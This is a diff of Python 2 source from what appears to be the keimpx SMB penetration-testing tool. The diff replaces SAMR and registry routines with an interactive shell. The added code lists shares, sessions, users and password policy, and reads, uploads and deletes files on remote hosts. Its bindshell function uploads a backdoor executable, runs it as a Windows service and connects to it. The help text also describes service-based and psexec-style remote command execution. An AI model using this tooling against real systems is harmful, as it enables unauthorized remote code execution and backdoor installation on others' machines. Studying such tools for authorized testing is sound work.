-        self.__rpcerror(self.__resp.get_return_code())
-        self.__mgr_handle = self.__resp.get_context_handle()
-
-    def __samr_disconnect(self):
-        '''
-        Disconnect from samr named pipe
-        '''
-        logger.debug('Disconneting from the SAMR named pipe')
-
-        if self.__mgr_handle:
-            data = self.__samr.closerequest(self.__mgr_handle)
-            self.__rpcerror(data.get_return_code())
-
+        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
+        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
+        self.__resp = self.__svc.get_server_info_102(self.trans.get_dip())
         self.__dce.disconnect()
 
-    def __samr_users(self, usrdomain=None):
-        '''
-        Enumerate users on the system
-        '''
-        self.__samr_domains(False)
+        print 'Operating system: %s' % self.smb.getServerOS()
+        print 'Netbios name: %s' % self.smb.getServerName()
+        print 'Domain: %s' % self.smb.getServerDomain()
+        print 'SMB dialect: %s' % check_dialect(self.smb.getDialect())
+        print 'NTLMv2 support: %s' % self.smb.doesSupportNTLMv2()
+        print 'UserPath: %s' % self.__resp['UserPath']
+        print 'Simultaneous users: %d' % self.__resp['Users']
+        print 'Version major: %d' % self.__resp['VersionMajor']
+        print 'Version minor: %d' % self.__resp['VersionMinor']
+        print 'Comment: %s' % self.__resp['Comment'] or ''
 
-        encoding = sys.getdefaultencoding()
+        # TODO: uncomment when SMBConnection will have a wrapper
+        # getServerTime() method for both SMBv1,2,3
+        #print 'Time: %s' % self.smb.get_server_time()
 
-        for domain_name, domain in self.domains_dict.items():
-            if usrdomain and usrdomain.upper() != domain_name.upper():
-                continue
+    def who(self):
+        logger.debug('Binding on Server Service (SRVSVC) interface')
+        self.smb_transport('srvsvc')
+        self.__dce = self.trans.get_dce_rpc()
+        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
+        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
+        resp = self.__svc.NetrSessionEnum()
 
-            logger.info('Looking up users in domain %s' % domain_name)
+        for session in resp:
+            print "host: %15s, user: %5s, active: %5d, idle: %5d, type: %5s, transport: %s" % (session['HostName'], session['UserName'], session['Active'], session['IDLE'], session['Type'],session['Transport'] )
 
-            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
-            self.__rpcerror(resp.get_return_code())
+    def shares(self):
+        self.__resp = self.smb.listShares()
+        count = 0
 
-            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
-            self.__rpcerror(resp.get_return_code())
+        for i in range(len(self.__resp)):
+            #name = self.__resp[i]['NetName'].decode('utf-16')
+            #comment = self.__resp[i]['Remark'].decode('utf-16')
+            name = self.__resp[i]['NetName']
+            comment = self.__resp[i]['Remark']
+            count += 1
+            self.shares_list.append(name)
 
-            self.__domain_context_handle = resp.get_context_handle()
+            print '[%d] %s (comment: %s)' % (count, name, comment)
 
-            resp = self.__samr.enumusers(self.__domain_context_handle)
-            self.__rpcerror(resp.get_return_code())
+        msg = 'Which share do you want to connect to? (default: 1) '
+        limit = len(self.shares_list)
+        choice = read_input(msg, limit)
 
-            done = False
+        self.use(self.shares_list[choice-1])
 
-            while done is False:
-                for user in resp.get_users().elements():
-                    uname = user.get_name().encode(encoding, 'replace')
-                    uid = user.get_id()
+    def use(self, share):
+        if not share:
+            raise missingShare, 'Share has not been specified'
 
-                    r = self.__samr.openuser(self.__domain_context_handle, uid)
-                    logger.debug('Found user %s (UID: %d)' % (uname, uid))
+        if self.tid:
+            self.smb.disconnectTree(self.tid)
 
-                    if r.get_return_code() == 0:
-                        info = self.__samr.queryuserinfo(r.get_context_handle()).get_user_info()
-                        entry = (uname, uid, info)
-                        self.users_list.add(entry)
-                        c = self.__samr.closerequest(r.get_context_handle())
+        self.share = share.strip('\x00')
+        self.tid = self.smb.connectTree(self.share)
+        self.pwd = '\\'
+        self.ls('', False)
 
-                # Do we have more users?
-                if resp.get_return_code() == 0x105:
-                    resp = self.__samr.enumusers(self.__domain_context_handle, resp.get_resume_handle())
-                else:
-                    done = True
+    def cd(self, path):
+        if not path:
+            return
 
-            if self.users_list:
-                num = len(self.users_list)
-                logger.info('Retrieved %d user%s' % (num, 's' if num > 1 else ''))
+        p = replace(path)
+        self.__oldpwd = self.pwd
+
+        if path == '.':
+            return
+        elif path == '..':
+            sep = self.pwd.split('\\')
+            self.pwd = ''.join('\\%s' % s for s in sep[:-1])
+            return
+
+        if p[0] == '\\':
+           self.pwd = path
+        else:
+           self.pwd = ntpath.join(self.pwd, path)
+
+        self.pwd = ntpath.normpath(self.pwd)
+
+        # Let's try to open the directory to see if it's valid
+        try:
+            fid = self.smb.openFile(self.tid, self.pwd)
+            self.smb.closeFile(self.tid, fid)
+            logger.warn('File is not a directory')
+            self.pwd = self.__oldpwd
+        except SessionError, e:
+            if e.getErrorCode() == nt_errors.STATUS_FILE_IS_A_DIRECTORY:
+               pass
+            elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
+                logger.warn('Access denied')
+                self.pwd = self.__oldpwd
+            elif e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:
+                logger.warn('File not found')
+                self.pwd = self.__oldpwd
             else:
-                logger.info('No users enumerated')
+                logger.warn('SMB error: %s' % (e.getErrorString(), ))
+                self.pwd = self.__oldpwd
 
-            for entry in self.users_list:
-                user, uid, info = entry
+    def pwd(self):
+        print ntpath.join(self.share, self.pwd)
 
-                print user
-                print '  User ID: %d' % uid
-                print '  Group ID: %d' % info.get_group_id()
-                print '  Enabled: %s' % ('False', 'True')[info.is_enabled()]
+    def ls(self, path, display=True):
+        self.check_share()
 
-                try:
-                    print '  Logon count: %d' % info.get_logon_count()
-                except ValueError:
-                    pass
+        if not path:
+            pwd = ntpath.join(self.pwd, '*')
+        else:
+           pwd = ntpath.join(self.pwd, path)
 
-                try:
-                    print '  Last Logon: %s' % info.get_logon_time()
-                except ValueError:
-                    pass
+        self.completion = []
+        pwd = replace(pwd)
+        pwd = ntpath.normpath(pwd)
 
-                try:
-                    print '  Last Logoff: %s' % info.get_logoff_time()
-                except ValueError:
-                    pass
-
-                try:
-                    print '  Kickoff: %s' % info.get_kickoff_time()
-                except ValueError:
-                    pass
-
-                try:
-                    print '  Last password set: %s' % info.get_pwd_last_set()
-                except ValueError:
-                    pass
-
-                try:
-                    print '  Password can change: %s' % info.get_pwd_can_change()
-                except ValueError:
-                    pass
-
-                try:
-                    print '  Password must change: %s' % info.get_pwd_must_change()
-                except ValueError:
-                    pass
-
-                try:
-                    print '  Bad password count: %d' % info.get_bad_pwd_count()
-                except ValueError:
-                    pass
-
-                items = info.get_items()
-
-                for i in MSRPCUserInfo.ITEMS.keys():
-                    name = items[MSRPCUserInfo.ITEMS[i]].get_name()
-                    name = name.encode(encoding, 'replace')
-
-                    if name:
-                        print '  %s: %s' % (i, name)
-
-            self.users_list = set()
-
-    def __samr_pswpolicy(self, usrdomain=None):
-        '''
-        Enumerate password policy on the system
-        '''
-        self.__samr_domains(False)
-
-        encoding = sys.getdefaultencoding()
-
-        for domain_name, domain in self.domains_dict.items():
-            if usrdomain and usrdomain.upper() != domain_name.upper():
-                continue
-
-            logger.info('Looking up password policy in domain %s' % domain_name)
-
-            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
-            self.__rpcerror(resp.get_return_code())
-
-            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
-            self.__rpcerror(resp.get_return_code())
-
-            self.__domain_context_handle = resp.get_context_handle()
-
-            resp = self.__samr.enumpswpolicy(self.__domain_context_handle)
-            resp.print_friendly()
-
-    def __samr_domains(self, display=True):
-        '''
-        Enumerate domains to which the system is part of
-        '''
-        logger.info('Enumerating domains')
-
-        resp = self.__samr.enumdomains(self.__mgr_handle)
-        self.__rpcerror(resp.get_return_code())
-        domains = resp.get_domains().elements()
-
-        if display is True:
-            print 'Domains:'
-
-        for domain in range(0, resp.get_entries_num()):
-            domain = domains[domain]
-            domain_name = domain.get_name()
-
-            if domain_name not in self.domains_dict:
-                self.domains_dict[domain_name] = domain
-
+        for f in self.smb.listPath(self.share, pwd):
             if display is True:
-                print '  %s' % domain_name
+                print '%s %8s %10d %s' % (time.ctime(float(f.get_mtime_epoch())), '<DIR>' if f.is_directory() > 0 else '', f.get_filesize(), f.get_longname())
 
-    def __winreg_connect(self):
+            self.completion.append((f.get_longname(),f.is_directory()))
+
+    def cat(self, filename):
+        self.check_share()
+        filename = ntpath.join(self.pwd, replace(filename))
+        self.fid = self.smb.openFile(self.tid, filename)
+        offset = 0
+
+        while 1:
+            try:
+                data = self.smb.readFile(self.tid, self.fid, offset)
+                print data
+
+                if len(data) == 0:
+                    break
+
+                offset += len(data)
+            except SessionError, e:
+                if e.getErrorCode() == nt_errors.STATUS_END_OF_FILE:
+                    break
+                else:
+                    logger.error('SMB error: %s' % (e.getErrorString(), ))
+
+        self.smb.closeFile(self.tid, self.fid)
+
+    def download(self, filename, destfile=None):
+        filename = os.path.basename(filename)
+        self.check_share()
+
+        if not destfile:
+            destfile = filename
+
+        fh = open(destfile, 'wb')
+        filename = ntpath.join(self.pwd, replace(filename))
+        self.smb.getFile(self.share, filename, fh.write)
+        fh.close()
+
+    def upload(self, pathname, destfile=None):
+        try:
+            fp = open(pathname, 'rb')
+        except IOError:
+            logger.error('Unable to open file %s' % pathname)
+            return False
+
+        self.check_share()
+
+        if not destfile:
+            destfile = os.path.basename(pathname)
+            destfile = ntpath.join(self.pwd, replace(destfile))
+
+        self.smb.putFile(self.share, destfile, fp.read)
+        fp.close()
+
+    def rename(self, srcfile, destfile=None):
+        self.check_share()
+        srcfile = ntpath.join(self.pwd, replace(srcfile))
+        destfile = ntpath.join(self.pwd, replace(destfile))
+        self.smb.rename(self.share, srcfile, destfile)
+
+    def mkdir(self, path):
+        self.check_share()
+        path = ntpath.join(self.pwd, replace(path))
+        self.smb.createDirectory(self.share, path)
+
+    def rm(self, filename):
+        self.check_share()
+        filename = ntpath.join(self.pwd, replace(filename))
+        self.smb.deleteFile(self.share, filename)
+
+    def rmdir(self, path):
+        self.check_share()
+        path = ntpath.join(self.pwd, replace(path))
+        self.smb.deleteDirectory(self.share, path)
+
+    def bindshell(self, port):
+        connected = False
+        srvname = ''.join([random.choice(string.letters) for _ in range(8)])
+        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
+        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in range(8)])
+
+        if not port:
+            port = 4445
+        elif not isinstance(port, int):
+            port = int(port)
+
+        if not os.path.exists(local_file):
+            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'
+
+        self.deploy(srvname, local_file, port, remote_file)
+
+        logger.info('Connecting to backdoor on port %d, wait..' % port)
+
+        for counter in xrange(0, 3):
+            try:
+                time.sleep(1)
+
+                if str(sys.version.split()[0]) >= '2.6':
+                    tn = Telnet(self.__dstip, port, 3)
+                else:
+                    tn = Telnet(self.__dstip, port)
+
+                connected = True
+                tn.interact()
+            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
+                if connected is False:
+                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e[1])
+
+                    if counter < 2:
+                        warn_msg += ', retrying..'
+                        logger.warn(warn_msg)
+                    else:
+                        logger.error(warn_msg)
+            except SessionError, e:
+                #traceback.print_exc()
+                logger.error('SMB error: %s' % (e.getErrorString(), ))
+            except KeyboardInterrupt, _:
+                print
+                logger.info('User aborted')
+            except Exception, e:
+                logger.error(str(e))
+
+            if connected is True:
+                tn.close()
+                sys.stdout.flush()
+                break
+
+        time.sleep(1)
+        self.undeploy(srvname)
+
+class InteractiveShell(cmd.Cmd):
+    def __init__(self, target, credential, execute_commands=None):
         '''
-        Connect to winreg named pipe
+        Initialize the object variables
         '''
 
-        logger.debug('Connecting to the WINREG named pipe')
+        cmd.Cmd.__init__(self)
 
-        self.__smb_transport('winreg')
+        self.smb_shell = SMBShell(target, credential, execute_commands)
+        logger.info('Launching interactive SMB shell')
+        self.prompt = '# '
 
-        logger.debug('Binding on Windows registry (WINREG) interface')
-        self.__dce = self.trans.get_dce_rpc()
-        self.__dce.bind(winreg.MSRPC_UUID_WINREG)
-        self.__winreg = winreg.DCERPCWinReg(self.__dce)
+        print 'Type help for list of commands'
 
-    def __winreg_disconnect(self):
+    def cmdloop(self):
+        while True:
+            try:
+                cmd.Cmd.cmdloop(self)
+            except SessionError, e:
+                #traceback.print_exc()
+                logger.error('SMB error: %s' % (e.getErrorString(), ))
+            except keimpxError, e:
+                logger.error(e)
+            except KeyboardInterrupt, _:
+                print
+                logger.info('User aborted')
+                self.do_exit('')
+            except Exception, e:
+                #traceback.print_exc()
+                logger.error(str(e))
+
+    def emptyline(self):
+        pass
+
+    def do_shell(self, cmd):
         '''
-        Disconnect from winreg named pipe
+        Execute a local command if the provided command is preceed by an
+        exclamation mark
         '''
+        process = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
+        stdout, _ = process.communicate()
 
-        logger.debug('Closing registry key')
-        self.__winreg.regCloseKey(self.__regkey_handle)
+        if stdout is not None:
+            print stdout
 
-        logger.debug('Disconneting from the WINREG named pipe')
-        self.__dce.disconnect()
-
-    def __winreg_parse(self):
+    def do_exit(self, line):
         '''
-        Parse the provided registry key
+        Disconnect the SMB session
         '''
+        self.smb_shell.logoff()
+        sys.exit(0)
 
-        __reg_key_parse = re.findall('(HKLM|HKCR|HKU|HKCU)\\\\(.*\\\\)(.+)$', self.__winreg_key, re.I)
-
-        if len(__reg_key_parse) < 1:
-            raise registryKey, 'Invalid registry key provided, make sure it is like HKLM\\registry\\path\\name'
-
-        self.__winreg_hive, self.__winreg_path, self.__winreg_name = __reg_key_parse[0]
-
-    def __winreg_open(self):
+    def do_help(self, line):
         '''
-        Bind to registry hive
+        Show the help menu
         '''
+        print '''Generic options
+===============
+help - show this message
+verbosity {level} - set verbosity level (0-2)
+info - returns NetrServerInfo main results
+who - returns the sessions currently connected at the target host (admin required)
+exit - terminates the SMB session and exit from the tool
+!{command} - execute a local command
 
-        self.__winreg_parse()
+Shares options
+==============
+shares - list available shares
+use {share} - connect to an specific share
+cd {path} - changes the current directory to {path}
+pwd - shows current remote directory
+ls {path} - lists all the files in the current directory
+cat {file} - display content of the selected file
+download {filename} [destfile] - downloads the filename from the current path
+upload {filename} [destfile] - uploads the filename into a remote share (or current path)
+rename {srcfile} {destfile} - rename a file
+mkdir {dirname} - creates the directory under the current path
+rm {file} - removes the selected file
+rmdir {dirname} - removes the directory under the current path
 
-        if self.__winreg_hive.upper() == 'HKLM':
-            self.__resp = self.__winreg.openHKLM()
-        elif self.__winreg_hive.upper() == 'HKCR':
-            self.__resp = self.__winreg.openHKCR()
-        elif self.__winreg_hive.upper() in ('HKU', 'HKCU'):
-            self.__resp = self.__winreg.openHKU()
+Services options
+================
+services [service name] - list services
+status {service name} - query the status of a service
+query {service name} - list the configuration of a service
+start {service name} - start a service
+stop {service name} - stop a service
+change {service name} - change the configuration of a service (in progress)
+deploy {service name} {local file} [service args] [remote file] [displayname] - deploy remotely a service executable
+undeploy {service name} - undeploy remotely a service executable
 
-        self.__mgr_handle = self.__resp.get_context_handle()
+Users options
+=============
+users [domain] - list users, optionally for a specific domain
+pswpolicy [domain] - list password policy, optionally for a specific domain
+domains - list domains to which the system is part of
 
-        logger.debug('Opening registry key')
+Registry options (Soon)
+================
+regread {registry key} - read a registry key
+regwrite {registry key} {registry value} - add a value to a registry key
+regdelete {registry key} - delete a registry key
 
-        self.__resp = self.__winreg.regOpenKey(self.__mgr_handle, self.__winreg_path, winreg.KEY_ALL_ACCESS)
-        self.__rpcerror(self.__resp.get_return_code())
-        self.__regkey_handle = self.__resp.get_context_handle()
+Take-over options
+=================
+bindshell [port] - spawn a shell listening on a TCP port on the target
+      This works by upload a custom bind shell, executing it as a service
+      and connecting to a TCP port where it listens, by default 4445/TCP.
+      If the target is behind a strict firewall it may not work.
+svcshell [mode] - semi-interactive shell through a custom Windows Service
+      This works by creating a service to execute a command, redirect its
+      output to a temporary file within a share and retrieving its content,
+      then deleting the service.
+      Mode of operation can be SHARE (default) or SERVER whereby a local
+      SMB server is instantiated to receive the output of the commands. This
+      is useful in the situation where the target machine does not have a
+      writeable share available - no extra ports are required.
+atexec {command} - executes a command through the Task Scheduler service (in progress)
+      Returns the output of such command. No interactive shell, one command
+      at a time - no extra ports are required.
+psexec [command] - executes a command through SMB named pipes (in progress)
+      Same technique employed by Sysinternal's PsExec. The default command
+      is cmd.exe therefore an interactive shell is established. It employs
+      RemComSvc - no extra ports are required.
+'''
 
-    def __winreg_read(self):
+    def do_verbosity(self, level):
+        set_verbosity(level)
+
+    def do_info(self, line):
         '''
-        Read a registry key
+        Display system information like operating system
         '''
+        self.smb_shell.info()
 
-        logger.info('Reading registry key %s value' % self.__winreg_key)
-
-        self.__regkey_value = self.__winreg.regQueryValue(self.__regkey_handle, self.__winreg_name, 1024)
-        self.__rpcerror(self.__regkey_value.get_return_code())
-
-        print self.__regkey_value.get_data()
-
-    def __winreg_write(self):
+    def do_who(self, line):
         '''
-        Write a value on a registry key
+        Display the sessions currently connected at the target host (admin required)
         '''
+        self.smb_shell.who()
 
-        logger.info('Write value %s to registry key %s' % (self.__winreg_value, self.__winreg_key))
-
-        resp = self.__winreg.regCreateKey(self.__regkey_handle, self.__winreg_name)
-        self.__rpcerror(resp.get_return_code())
-
-        resp = self.__winreg.regSetValue(self.__regkey_handle, winreg.REG_SZ, self.__winreg_name, self.__winreg_value)
-        self.__rpcerror(resp.get_return_code())
-
-    def __winreg_delete(self):
+    def do_shares(self, line):
         '''
-        Delete a registry key
+        List available shares and display a menu to select which share to
+        connect to
         '''
+        self.smb_shell.shares()
 
-        logger.error('Registry key deletion is not yet implemented')
-        return
-
-        # TODO: it does not work yet
-        logger.info('Deleting registry key %s' % self.__winreg_key)
-
-        resp = self.__winreg.regDeleteValue(self.__regkey_handle, '')
-        self.__rpcerror(resp.get_return_code())
-
-        resp = self.__winreg.regDeleteKey(self.__regkey_handle, self.__winreg_name)
-        self.__rpcerror(resp.get_return_code())
-
-    def __rpcerror(self, code):
+    def do_use(self, share):
         '''
-        Check for an error in a response packet
+        Select the share to connect to
         '''
+        self.smb_shell.use(share)
 
-        if code in dcerpc.rpc_status_codes:
-            logger.error('Error during negotiation: %s (%d)' % (dcerpc.rpc_status_codes[code], code))
-            raise RuntimeError
+    def complete_cd(self, text, line, begidx, endidx):
+        return self.complete_get(text, line, begidx, endidx, include=2)
 
-        elif code != 0:
-            logger.error('Unknown error during negotiation (%d)' % code)
-            raise RuntimeError
+    def do_cd(self, path):
+        '''
+        Change the current path
+        '''
+        self.smb_shell.cd(path)
 
-        #logger.debug('RPC code returned: %d' % code)
+    def do_pwd(self, line):
+        '''
+        Display the current path
+        '''
+        self.smb_shell.pwd()
 
-def check_dialect(dialect):
-    if dialect == SMB_DIALECT:
-        return 'SMBv1'
-    elif dialect == SMB2_DIALECT_002:
-        return 'SMBv2.0'
-    elif dialect == SMB2_DIALECT_21:
-        return 'SMBv2.1'
-    else:
-        return 'SMBv3.0'
+    def do_dir(self, path):
+        '''
+        Alias to ls
+        '''
+        self.do_ls(path)
+
+    def do_ls(self, path, display=True):
+        '''
+        List files from the current path
+        '''
+        self.smb_shell.ls(path, display)
+
+    def complete_cat(self, text, line, begidx, endidx):
+        return self.complete_get(text, line, begidx, endidx, include=1)
+
+    def do_cat(self, filename):
+        '''
+        Display a file content from the current path
+        '''
+        self.smb_shell.cat(filename)
+
+    def complete_get(self, text, line, begidx, endidx, include=1):
+        # include means
+        # 0 all files and directories
+        # 1 just files
+        # 2 just directories
+        p = string.replace(line, '/', '\\')
+
+        if p.find('\\') < 0:
+            items = []
+
+            if include == 1:
+                mask = 0
+            else:
+                mask = 0x010
+
+            for i in self.smb_shell.completion:
+                if i[1] == mask or include == 0:
+                    items.append(i[0])
+
+            if text:
+                return [item for item in items if item.upper().startswith(text.upper())]
+            else:
+                return items
+
+    def do_get(self, filename, destfile=None):
+        '''
+        Alias to download
+        '''
+        self.do_download(filename, destfile)
+
+    def complete_download(self, text, line, begidx, endidx):
+        return self.complete_get(text, line, begidx, endidx, include=1)
+
+    def do_download(self, filename, destfile=None):
+        '''
+        Download a file from the current path
+        '''
+        if not destfile:
+            argvalues = shlex.split(filename)
+
+            if len(argvalues) < 1:
+                raise missingOption, 'You have to specify at least the remote file name'
+            elif len(argvalues) > 1:
+                destfile = argvalues[1]
+
+            filename = argvalues[0]
+
+        self.smb_shell.download(filename, destfile)
+
+    def do_put(self, pathname, destfile=None):
+        '''
+        Alias to upload
+        '''
+        self.do_upload(pathname, destfile)
+
+    def do_upload(self, pathname, destfile=None):
+        '''
+        Upload a file in the current path
+        '''
+        if not destfile:
+            argvalues = shlex.split(pathname)
+
+            if len(argvalues) < 1:
+                raise missingOption, 'You have to specify at least the local file name'
+            elif len(argvalues) > 1:
+                destfile = argvalues[1]
+
+            pathname = argvalues[0]
+
+        self.smb_shell.upload(pathname, destfile)
+
+    def do_mv(self, srcfile, destfile=None):
+        '''
+        Alias to rename
+        '''
+        self.do_rename(srcfile, destfile)
+
+    def do_rename(self, srcfile, destfile=None):
+        '''
+        Rename a file
+        '''
+        if not destfile:
+            argvalues = shlex.split(srcfile)
+
+            if len(argvalues) != 2:
+                raise missingOption, 'You have to specify source and destination file names'
+            else:
+                srcfile, destfile = argvalues
+                
+        self.smb_shell.rename(srcfile, destfile)
+
+    def do_mkdir(self, path):
+        '''
+        Create a directory in the current share
+        '''
+        self.smb_shell.mkdir(path)
+
+    def complete_rm(self, text, line, begidx, endidx):
+        return self.complete_get(text, line, begidx, endidx, include=1)
+
+    def do_rm(self, filename):
+        '''
+        Remove a file in the current share
+        '''
+        self.smb_shell.rm(filename)
+
+    def complete_rmdir(self, text, line, begidx, endidx):
+        return self.complete_get(text, line, begidx, endidx, include=2)
+
+    def do_rmdir(self, path):
+        '''
+        Remove a directory in the current share
+        '''
+        self.smb_shell.rmdir(path)
+
+    def do_services(self, srvname):
+        self.smb_shell.services(srvname)
+
+    def do_status(self, srvname):
+        if not srvname:
+            raise missingService, 'Service name has not been specified'
+
+        self.smb_shell.status(srvname)
+
+    def do_query(self, srvname):
+        if not srvname:
+            raise missingService, 'Service name has not been specified'
+
+        self.smb_shell.query(srvname)
+
+    def do_start(self, srvname, srvargs=''):
+        '''
+        Start a service.
+        '''
+        if not srvargs:
+            argvalues = shlex.split(srvname)
+
+            if len(argvalues) < 1:
+                raise missingService, 'Service name has not been specified'
+            elif len(argvalues) > 1:
+                srvargs = argvalues[1]
+
+            srvname = argvalues[0]
+
+        self.smb_shell.start(srvname, srvargs)
+
+    def do_stop(self, srvname):
+        '''
+        Stop a service.
+        '''
+        if not srvname:
+            raise missingService, 'Service name has not been specified'
+
+        self.smb_shell.stop(srvname)
+
+    def do_change(self, srvname):
+        '''
+        Change the configuration of a service.
+        '''
+        if not srvname:
+            raise missingService, 'Service name has not been specified'
+
+        self.smb_shell.change(srvname)
+
+    def do_deploy(self, srvname, local_file=None, srvargs='', remote_file=None, displayname=None):
+        '''
+        Deploy a Windows service: upload the service executable to the
+        file system, create a service as 'Automatic' and start it
+
+        Sample command:
+        deploy shortname contrib/srv_bindshell.exe 5438 remotefile.exe 'long name'
+        '''
+        argvalues = shlex.split(srvname)
+
+        if len(argvalues) < 1:
+            raise missingService, 'Service name has not been specified'
+
+        srvname = argvalues[0]
+
+        if not local_file:
+            if len(argvalues) < 2:
+                raise missingFile, 'Service file %s has not been specified' % local_file
+            if len(argvalues) >= 5:
+                displayname = argvalues[4]
+            if len(argvalues) >= 4:
+                remote_file = argvalues[3]
+            if len(argvalues) >= 3:
+                srvargs = argvalues[2]
+            if len(argvalues) >= 2:
+                local_file = argvalues[1]
+
+        if not os.path.exists(local_file):
+            raise missingFile, 'Service file %s does not exist' % local_file
+
+        srvname = str(srvname)
+        srvargs = str(srvargs)
+
+        if not remote_file:
+            remote_file = str(os.path.basename(local_file.replace('\\', '/')))
+        else:
+            remote_file = str(os.path.basename(remote_file.replace('\\', '/')))
+
+        if not displayname:
+            displayname = srvname
+        else:
+            displayname = str(displayname)
+
+        self.smb_shell.deploy(srvname, local_file, srvargs, remote_file, displayname)
+
+    def do_undeploy(self, srvname):
+        '''
+        Wrapper method to undeploy a Windows service. It stops the
+        services, removes it and removes the executable from the file
+        system
+        '''
+        if not srvname:
+            raise missingService, 'Service name has not been specified'
+
+        self.smb_shell.undeploy(srvname)
+
+    def do_users(self, usrdomain):
+        '''
+        List users, optionally for a specific domain
+        '''
+        self.smb_shell.users(usrdomain)
+
+    def do_pswpolicy(self, usrdomain):
+        '''
+        List password policy, optionally for a specific domain
+        '''
+        self.smb_shell.pswpolicy(usrdomain)
+
+    def do_domains(self, line):
+        '''
+        List domains to which the system is part of
+        '''
+        self.smb_shell.domains()
+
+    def do_bindshell(self, port):
+        '''
+        Spawn a shell listening on a TCP port on the target
+        '''
+        self.smb_shell.bindshell(port)
+
+    def do_svcshell(self, mode='SHARE'):
+        '''
+        Semi-interactive shell through a custom Windows Service
+        '''
+        self.smb_shell.svcshell(mode)
+
+    def do_atexec(self, command):
+        '''
+        Executes a command through the Task Scheduler service
+        '''
+        logger.warn('Command not yet implemented')
+
+    def do_psexec(self, command):
+        '''
+        Executes a command through SMB named pipes
+        '''
+        logger.warn('Command not yet implemented')
 
 class test_login(Thread):
     def __init__(self, target):
@@ -2276,7 +2215,7 @@ def executelist():
             first_credentials = valid_credentials[0]
 
         try:
-            shell = SMBShell(target, first_credentials, execute_commands)
+            shell = InteractiveShell(target, first_credentials, execute_commands)
             shell.cmdloop()
         except RuntimeError:
             sys.exit(255)
@@ -2740,7 +2679,7 @@ def main():
             uses_libedit = True
 
     try:
-        shell = SMBShell(user_target, user_credentials)
+        shell = InteractiveShell(user_target, user_credentials)
         shell.cmdloop()
     except RuntimeError:
         sys.exit(255)
